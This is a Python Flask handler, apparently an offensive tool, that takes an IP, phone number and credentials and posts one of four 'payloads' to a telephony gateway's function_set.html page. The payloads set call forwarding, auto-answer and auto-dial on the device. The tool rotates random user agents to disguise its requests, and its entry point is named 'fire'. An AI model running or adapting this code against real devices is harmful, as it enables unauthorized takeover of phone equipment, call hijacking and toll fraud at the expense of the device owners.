from flask import request, jsonify, Response
import json, sys
import requests
from requests.auth import HTTPDigestAuth 

from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem

software_names = [SoftwareName.CHROME.value]
operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]   
user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)
user_agent = user_agent_rotator.get_random_user_agent()


def setForwardingNumber(url, number, username, password, payloadNum, ua):
    payloads = [
            { "ring": "3", "autoAnswer": "1", "forwardingCallNo": number, "autoAnswerClids": "|", "autoDial": "1", "autoDialTimeout": "5", "callingTimeout": "0", "useOutboundTone": "1", "outboundCode": "1", "useVirtualPstnDailTone": "1", "dtmfTrunkType": "0", "hookFlashInt": "0", "callLogType": "0" },
            { "ring": "3", "autoAnswer": "1", "forwardingCallNo": number, "autoAnswerClids": "|", "bell_from": "0", "autoDial": "1", "autoDialTimeout": "5", "prefix": "032", "callingTimeout": "0", "hookFlashInt": "0", "callLogType": "0", "new_sms_notice_type": "0", "backlight_seconds": "0"},
            { "ring": "3", "autoAnswer": "1", "forwardingCallNo": number, "autoAnswerClids": "|", "autoDial": "1", "autoDialTimeout": "5", "callingTimeout": "0", "hookFlashInt": "0", "callLogType": "0"},
            { "ring": "3", "autoAnswer": "1", "forwardingCallNo": number, "autoAnswerClids": "|", "autoDial": "1", "autoDialTimeout": "5", "callingTimeout": "0", "autoPrefix": "1", "prefix": "032", "hookFlashInt": "0", "callLogType": "0", "new_sms_notice_type": "0", "backlight_seconds": "0"}
    ]

    print('payloads => ' + str(len(payloads)))

    if 'http' not in url:
        url = 'http://' + url

    ip = url.replace('https:', '').replace('http:', '').replace('/', '')

    try: 
        ret = requests.post(url + "/function_set.html", 
                payloads[payloadNum],
                headers = {
                    "Host": ip,
                    "User-Agent":ua,
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language":"en-US,en;q=0.5",
                    "Accept-Encoding":"gzip, deflate",
                    "Content-Type":"application/x-www-form-urlencoded",
                    "Origin": url,
                    "DNT":"1",
                    "Connection":"keep-alive",
                    "Referer": url + "/function.html",
                    "Upgrade-Insecure-Requests":"1"
        }, auth=HTTPDigestAuth(username, password))
        print(ret.text, file=sys.stderr)
        the_status = ret.status_code
    except requests.exceptions.ConnectionError:
        the_status = "CLOSED CONNECTION"

    return {
        'target': url,
        'status_code': the_status
    }

def fire():
    # It'll throw a 400 if it can't find a specific arg
    print(request.args['ip'], request.args['number'], request.args['username'], request.args['password'], int(request.args['payload'])-1)
    ua = user_agent_rotator.get_random_user_agent()

    print("Using ua -> " + ua)

    report = setForwardingNumber(request.args['ip'], request.args['number'], request.args['username'], request.args['password'], int(request.args['payload'])-1, ua)

    return Response(json.dumps(report), status=200, mimetype='application/json')

